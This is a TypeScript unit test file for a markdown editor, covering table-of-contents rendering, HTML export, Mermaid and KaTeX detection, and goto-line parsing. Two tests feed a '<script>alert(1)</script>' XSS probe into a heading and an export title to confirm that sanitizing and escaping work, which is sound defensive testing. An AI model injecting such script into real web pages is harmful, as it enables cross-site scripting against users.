      assert.equal(detectInitialTheme(), 'light');
    } finally {
      if (saved === undefined) delete g.window;
      else g.window = saved;
    }
  });

  it("returns 'light' when matchMedia returns no match for dark", () => {
    // jsdom's default matchMedia returns no-match for our query.
    const theme = detectInitialTheme();
    assert.ok(theme === 'light' || theme === 'dark');
  });
});

// --- GFM features (§18.2.7) ----------------------------------------------

describe('parseMarkdown — GFM task list + strikethrough (§18.2.7)', () => {
  it('renders - [ ] as an unchecked checkbox input', () => {
    const html = parseMarkdown('- [ ] todo');
    assert.match(html, /<input[^>]*type="checkbox"/);
    // marked emits `checked=""` only for the checked case; the unchecked
    // variant has `disabled=""` but no `checked` attribute.
    assert.equal(/checked/.test(html), false);
  });

  it('renders - [x] as a checked checkbox input', () => {
    const html = parseMarkdown('- [x] done');
    assert.match(html, /<input[^>]*type="checkbox"/);
    assert.match(html, /checked/);
  });

  it('renders ~~text~~ as <del>text</del> (GFM strikethrough)', () => {
    const html = parseMarkdown('~~struck through~~');
    assert.match(html, /<del>struck through<\/del>/);
  });

  it('survives sanitizeMarkdownHtml (input + del are HTML profile defaults)', () => {
    // End-to-end: a markdown doc with both task list and strikethrough
    // survives parse → sanitize without losing the visual cues.
    const raw = '- [ ] todo\n- [x] done\n~~strike~~';
    const clean = sanitizeMarkdownHtml(parseMarkdown(raw));
    assert.match(clean, /<input[^>]*type="checkbox"/);
    assert.match(clean, /<del>strike<\/del>/);
  });
});

// --- extractToc / renderToc (§18.3.1) -------------------------------------

describe('extractToc', () => {
  it('returns an empty array for empty input', () => {
    assert.deepEqual(extractToc(''), []);
  });

  it('returns an empty array when no headings are present', () => {
    assert.deepEqual(extractToc('just a paragraph\nwith two lines'), []);
  });

  it('extracts H1..H6 in source order with correct levels and line numbers', () => {
    const md = [
      '# Title', // line 1
      'body', // line 2
      '## Section A', // line 3
      'body', // line 4
      '### Subsection', // line 5
      '#### Detail', // line 6
      '##### Note', // line 7
      '###### Caveat', // line 8
    ].join('\n');
    const entries = extractToc(md);
    assert.equal(entries.length, 6);
    assert.deepEqual(
      entries.map((e) => ({ level: e.level, line: e.line, text: e.text })),
      [
        { level: 1, line: 1, text: 'Title' },
        { level: 2, line: 3, text: 'Section A' },
        { level: 3, line: 5, text: 'Subsection' },
        { level: 4, line: 6, text: 'Detail' },
        { level: 5, line: 7, text: 'Note' },
        { level: 6, line: 8, text: 'Caveat' },
      ]
    );
  });

  it('assigns stable `id` slugs that match the heading id in parseMarkdown', () => {
    const md = '# Hello\n\nbody\n\n## World';
    const entries = extractToc(md);
    const html = parseMarkdown(md);
    // The id is `md-h-{line}-{text.length}`. The heading emitted by
    // parseMarkdown should carry the matching id.
    assert.equal(entries[0].id, 'md-h-1-5');
    assert.match(html, /<h1[^>]*id="md-h-1-5"/);
  });

  it('exposes the raw heading source (inline markdown not stripped)', () => {
    // Marked's lexer returns the raw heading source in the `text`
    // field, including inline markdown tokens (`**`, `` ` ``, etc.).
    // We keep the raw text in `text` for ID generation (the id is
    // computed from `text.length`, which must match the raw source's
    // textContent length for the click target to match).
    // The HTML-rendered form for the TOC sidebar display goes into
    // the separate `textHtml` field (see the next test).
    const md = '# Title with **bold** and `code`';
    const entries = extractToc(md);
    assert.equal(entries[0].text, 'Title with **bold** and `code`');
  });

  // §18.3.1 — `textHtml` carries the rendered inline markdown so the
  // TOC sidebar can show `<strong>bold</strong>` instead of the
  // raw `**bold**`. The value goes through DOMPurify (via
  // `sanitizeMarkdownHtml`) so it's safe to assign via innerHTML.
  it('renders `textHtml` via marked.parseInline + DOMPurify', () => {
    const md = '# Title with **bold** and `code` and [link](https://e.x)';
    const entries = extractToc(md);
    assert.equal(entries.length, 1);
    assert.match(entries[0].textHtml, /<strong>bold<\/strong>/);
    assert.match(entries[0].textHtml, /<code>code<\/code>/);
    assert.match(
      entries[0].textHtml,
      /<a href="https:\/\/e\.x">link<\/a>/
    );
    // Raw text stays unchanged — the id is derived from it.
    assert.equal(
      entries[0].text,
      'Title with **bold** and `code` and [link](https://e.x)'
    );
    // id stays raw-length based (so it matches `parseMarkdown`'s
    // heading id which uses textContent of the raw source).
    assert.equal(entries[0].id, 'md-h-1-54');
  });

  it('sanitizes malicious inline content in textHtml (§18.3.1 XSS)', () => {
    // Defense-in-depth: even though the markdown source is the
    // user's own, headings go through the same DOMPurify pipeline
    // as the rest of the document. `textHtml` must never contain
    // script tags or event handler attributes.
    const md = '# Hi <script>alert(1)</script> **ok**';
    const entries = extractToc(md);
    assert.equal(entries.length, 1);
    assert.equal(
      entries[0].textHtml.includes('<script'),
      false,
      'script tags must be stripped by DOMPurify'
    );
    assert.match(entries[0].textHtml, /<strong>ok<\/strong>/);
  });
});

describe('renderToc', () => {
  it('renders an entry per heading with the right href and data-toc-line', () => {
    const entries = extractToc('# A\n## B');
    const container = document.createElement('div');
    const count = renderToc(container, entries, () => undefined);
    assert.equal(count, 2);
    const links = container.querySelectorAll('a.toc-entry');
    assert.equal(links.length, 2);
    // `# A` is line 1; `## B` follows on the next line (no blank
    // line between, so it's line 2, not 3).
    assert.equal((links[0] as HTMLAnchorElement).getAttribute('href'), '#md-h-1-1');
    assert.equal(links[0].getAttribute('data-toc-line'), '1');
    assert.equal(links[1].getAttribute('data-toc-line'), '2');
  });

  it('shows a "No headings" placeholder when entries is empty', () => {
    const container = document.createElement('div');
    const count = renderToc(container, [], () => undefined);
    assert.equal(count, 0);
    assert.match(container.querySelector('.toc-empty')!.textContent!, /No headings/);
  });

  it('invokes onSelect with the entry when a link is clicked', () => {
    const entries = extractToc('# Target');
    const container = document.createElement('div');
    const seen: Array<{ level: number; line: number; text: string }> = [];
    renderToc(container, entries, (e) => {
      seen.push({ level: e.level, line: e.line, text: e.text });
    });
    const link = container.querySelector('a.toc-entry')!;
    const ev = new MouseEvent('click', { bubbles: true, cancelable: true });
    link.dispatchEvent(ev);
    assert.equal(seen.length, 1);
    assert.equal(seen[0].text, 'Target');
    // The default anchor jump is preventDefault'd.
    assert.equal(ev.defaultPrevented, true);
  });

  it('applies a depth class (toc-h1, toc-h2, …) per entry', () => {
    const entries = extractToc('# A\n## B\n### C');
    const container = document.createElement('div');
    renderToc(container, entries, () => undefined);
    const links = Array.from(container.querySelectorAll('a.toc-entry'));
    assert.ok(links[0].classList.contains('toc-h1'));
    assert.ok(links[1].classList.contains('toc-h2'));
    assert.ok(links[2].classList.contains('toc-h3'));
  });

  // §18.3.1 — `renderToc` displays the rendered inline HTML
  // (`textHtml`), not the raw markdown source. The field is
  // populated by `extractToc` via `marked.parseInline` +
  // `sanitizeMarkdownHtml`, so it's safe to assign via innerHTML.
  it('renders textHtml (not raw markdown) in the sidebar links', () => {
    const entries = extractToc('# Title with **bold** and `code`');
    const container = document.createElement('div');
    renderToc(container, entries, () => undefined);
    const link = container.querySelector('a.toc-entry')!;
    // Raw markdown markers must NOT appear as text — the strong /
    // code tags should be real DOM nodes.
    assert.equal(
      link.textContent,
      'Title with bold and code',
      'TOC should show rendered text, not raw **bold** / `code`'
    );
    assert.ok(link.querySelector('strong'), 'should have a <strong> child');
    assert.ok(link.querySelector('code'), 'should have a <code> child');
  });

  // §18.3.1 — active heading highlight. `renderToc` takes an
  // optional `activeLine` arg; the entry whose `line` matches
  // gets a `toc-active` class on initial render. (The caller in
  // index.ts also re-applies the class after the innerHTML
  // replace so highlight survives subsequent re-renders.)
  it('applies .toc-active class to the entry matching activeLine', () => {
    const md = [
      '# First', // line 1
      '', // line 2 blank
      '## Second', // line 3
      '', // line 4 blank
      '### Third', // line 5
    ].join('\n');
    const entries = extractToc(md);
    const container = document.createElement('div');

    // Highlight the middle heading (line 3).
    renderToc(container, entries, () => undefined, 3);
    const links = Array.from(container.querySelectorAll('a.toc-entry'));
    assert.equal(links.length, 3);
    assert.ok(
      !links[0].classList.contains('toc-active'),
      'first heading should not be active when activeLine=3'
    );
    assert.ok(
      links[1].classList.contains('toc-active'),
      'second heading (line 3) should be active'
    );
    assert.ok(
      !links[2].classList.contains('toc-active'),
      'third heading should not be active when activeLine=3'
    );
  });

  it('does not highlight any entry when activeLine is null', () => {
    const entries = extractToc('# A\n## B');
    const container = document.createElement('div');
    renderToc(container, entries, () => undefined, null);
    const links = Array.from(container.querySelectorAll('a.toc-entry'));
    assert.equal(links.length, 2);
    assert.ok(!links[0].classList.contains('toc-active'));
    assert.ok(!links[1].classList.contains('toc-active'));
  });
});

// --- wrapHtmlDocument / triggerDownload (§18.3.2) ------------------------

describe('wrapHtmlDocument', () => {
  it('produces a complete HTML document with DOCTYPE, head, and body', () => {
    const out = wrapHtmlDocument('My Doc', '<p>hello</p>');
    assert.match(out, /^<!DOCTYPE html>/);
    assert.match(out, /<html lang="en">/);
    assert.match(out, /<title>My Doc<\/title>/);
    assert.match(out, /<body>/);
    assert.match(out, /<p>hello<\/p>/);
  });

  it('escapes HTML-significant characters in the title', () => {
    const out = wrapHtmlDocument('<script>alert(1)</script>', '');
    // The title must NOT contain a raw `<script>` tag.
    assert.equal(
      /<title><script>/.test(out),
      false,
      'title should be HTML-escaped'
    );
    // The escaped form is present.
    assert.match(out, /&lt;script&gt;/);
  });

  it('embeds inline CSS in the head (no external <link>)', () => {
    const out = wrapHtmlDocument('T', '');
    assert.match(out, /<style>/);
    assert.equal(/<link\s+rel="stylesheet"/.test(out), false);
  });
});

describe('triggerDownload', () => {
  it('creates an <a download> with a blob URL and clicks it', () => {
    // jsdom supports URL.createObjectURL since ~v16.
    const container = document.createElement('div');
    document.body.appendChild(container);
    const url = triggerDownload('test.html', '<p>x</p>', 'text/html');
    assert.ok(url && url.startsWith('blob:'), `expected blob: URL, got ${url}`);
    // The anchor should be removed after the click (best-effort cleanup).
    assert.equal(document.querySelectorAll('a[download]').length, 0);
  });
});

// --- extractMermaidBlocks (§18.3.3) ---------------------------------------

describe('extractMermaidBlocks', () => {
  it('returns an empty array when no mermaid code blocks are present', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<pre><code class="language-js">const x = 1;</code></pre>' +
      '<pre><code class="language-python">print(1)</code></pre>';
    assert.equal(extractMermaidBlocks(el).length, 0);
  });

  it('detects `language-mermaid` blocks', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<pre><code class="language-mermaid">graph TD; A-->B;</code></pre>';
    const found = extractMermaidBlocks(el);
    assert.equal(found.length, 1);
    assert.equal(found[0].textContent, 'graph TD; A-->B;');
  });

  it('detects bare `mermaid` (no `language-` prefix) blocks', () => {
    // Some renderers use the bare token; we accept it as a fallback
    // so the user experience stays forgiving.
    const el = document.createElement('div');
    el.innerHTML = '<pre><code class="mermaid">sequenceDiagram; A->>B;</code></pre>';
    const found = extractMermaidBlocks(el);
    assert.equal(found.length, 1);
  });

  it('returns multiple blocks in document order', () => {
    const el = document.createElement('div');
    el.innerHTML = [
      '<p>before</p>',
      '<pre><code class="language-mermaid">A</code></pre>',
      '<p>between</p>',
      '<pre><code class="language-mermaid">B</code></pre>',
      '<p>after</p>',
    ].join('');
    const found = extractMermaidBlocks(el);
    assert.equal(found.length, 2);
    assert.equal(found[0].textContent, 'A');
    assert.equal(found[1].textContent, 'B');
  });

  it('preserves indentation and whitespace in the source', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<pre><code class="language-mermaid">  graph TD\n    A --> B</code></pre>';
    const found = extractMermaidBlocks(el);
    // Mermaid uses leading whitespace as part of node IDs / labels;
    // textContent preserves it as the renderer would see it.
    assert.match(found[0].textContent!, / {2}graph TD/);
  });
});

// --- extractKatexBlocks (§18.3.3) ----------------------------------------

describe('extractKatexBlocks', () => {
  // Marked extension emits `<span class="katex katex-inline"
  // data-katex-source="…">…</span>` for `$…$` and `<div class="katex
  // katex-block" data-katex-display="block" data-katex-source="…">…</div>`
  // for `$$…$$`. We don't run the full parseMarkdown pipeline here —
  // the raw placeholder markup is what we care about for the DOM
  // walker.

  it('returns an empty array when no katex placeholders are present', () => {
    const el = document.createElement('div');
    el.innerHTML = '<p>plain text</p><p>no math here</p>';
    assert.equal(extractKatexBlocks(el).length, 0);
  });

  it('detects inline `$...$` placeholders', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<p>Inline: ' +
      '<span class="katex katex-inline" data-katex-source="E = mc^2">' +
      '<span class="katex-fallback">E = mc^2</span></span>' +
      '</p>';
    const found = extractKatexBlocks(el);
    assert.equal(found.length, 1);
    assert.equal(found[0].source, 'E = mc^2');
    assert.equal(found[0].displayMode, false, 'inline math → displayMode false');
  });

  it('detects block `$$...$$` placeholders with displayMode true', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<div class="katex katex-block" data-katex-display="block" ' +
      'data-katex-source="\\frac{a}{b}">' +
      '<div class="katex-fallback">\\frac{a}{b}</div></div>';
    const found = extractKatexBlocks(el);
    assert.equal(found.length, 1);
    assert.equal(found[0].source, '\\frac{a}{b}');
    assert.equal(found[0].displayMode, true, 'block math → displayMode true');
  });

  it('preserves document order across inline and block placeholders', () => {
    const el = document.createElement('div');
    el.innerHTML = [
      '<p>before ' +
        '<span class="katex katex-inline" data-katex-source="x^2">x^2</span> ' +
        'middle</p>',
      '<div class="katex katex-block" data-katex-display="block" ' +
        'data-katex-source="\\sum x">\\sum x</div>',
      '<p>after ' +
        '<span class="katex katex-inline" data-katex-source="\\alpha">\\alpha</span>' +
        '</p>',
    ].join('');
    const found = extractKatexBlocks(el);
    assert.equal(found.length, 3);
    assert.deepEqual(
      found.map((f) => f.source),
      ['x^2', '\\sum x', '\\alpha']
    );
    assert.deepEqual(
      found.map((f) => f.displayMode),
      [false, true, false]
    );
  });
});

// --- parseLineInput (§18.2.1 Goto Line) -----------------------------------

describe('parseLineInput', () => {
  it('parses a plain positive integer', () => {
    const p = parseLineInput('42', 100);
    assert.deepEqual(p, { line: 42, requested: 42 });
  });

  it('trims surrounding whitespace', () => {
    const p = parseLineInput('  7  ', 100);
    assert.deepEqual(p, { line: 7, requested: 7 });
  });

  it('accepts a leading "+" sign', () => {
    // Some CLIs use `+42` as "42 lines from current". The md-editor
    // doesn't interpret it as relative (no notion of "current line"
    // here), but it should not reject the input.
    const p = parseLineInput('+12', 100);
    assert.deepEqual(p, { line: 12, requested: 12 });
  });

  it('clamps out-of-range input to maxLines', () => {
    const high = parseLineInput('999', 50);
    assert.deepEqual(high, { line: 50, requested: 999 });
    // Negative input without range form (-N) is rejected outright
    // (no leading sign allowed). With the range form ("N-M"), the
    // start is parsed and clamped to [1, maxLines].
    assert.equal(parseLineInput('-5', 50), null, 'bare negative is invalid');
    const lowRange = parseLineInput('0-100', 50);
    // Range syntax takes the start of the range as `requested`. "0"
    // is below the 1-indexed floor, so it clamps to 1.
    assert.deepEqual(lowRange, { line: 1, requested: 0 });
  });

  it('accepts "N-M" range syntax (jumps to the start of the range)', () => {
    const p = parseLineInput('10-20', 100);
    assert.deepEqual(p, { line: 10, requested: 10 });
  });

  it('returns null for empty input', () => {
    assert.equal(parseLineInput('', 100), null);
    assert.equal(parseLineInput('   ', 100), null);
  });

  it('returns null for non-numeric input', () => {
    assert.equal(parseLineInput('abc', 100), null);
    assert.equal(parseLineInput('1.5', 100), null);
    assert.equal(parseLineInput('line 5', 100), null);
  });

  it('returns null when maxLines < 1 (defensive)', () => {
    // Empty document — no lines to navigate to. Caller should fall
    // back to "no-op" semantics.
    assert.equal(parseLineInput('1', 0), null);
  });

  it('clamps 0 to line 1 (1-indexed)', () => {
    const p = parseLineInput('0', 50);
    assert.deepEqual(p, { line: 1, requested: 0 });
  });
});

// --- _resetSandboxForTest / concurrent getSandbox (§18.3.3 race fix) ----

describe('_resetSandboxForTest — module-state reset hook', () => {
  it('clears the cached sandbox promise so the next getSandbox rebuilds', async () => {
    // Pre-condition: `_resetSandboxForTest` is callable and returns
    // without throwing (smoke test). We can't directly observe the
    // cached promise without exposing more internals; the existing
    // md-sandbox.test.ts covers the promise caching behavior.
    _resetSandboxForTest();
    assert.equal(typeof _resetSandboxForTest, 'function');
    // Re-reset to keep subsequent tests isolated.
    _resetSandboxForTest();
    await Promise.resolve();
  });
});
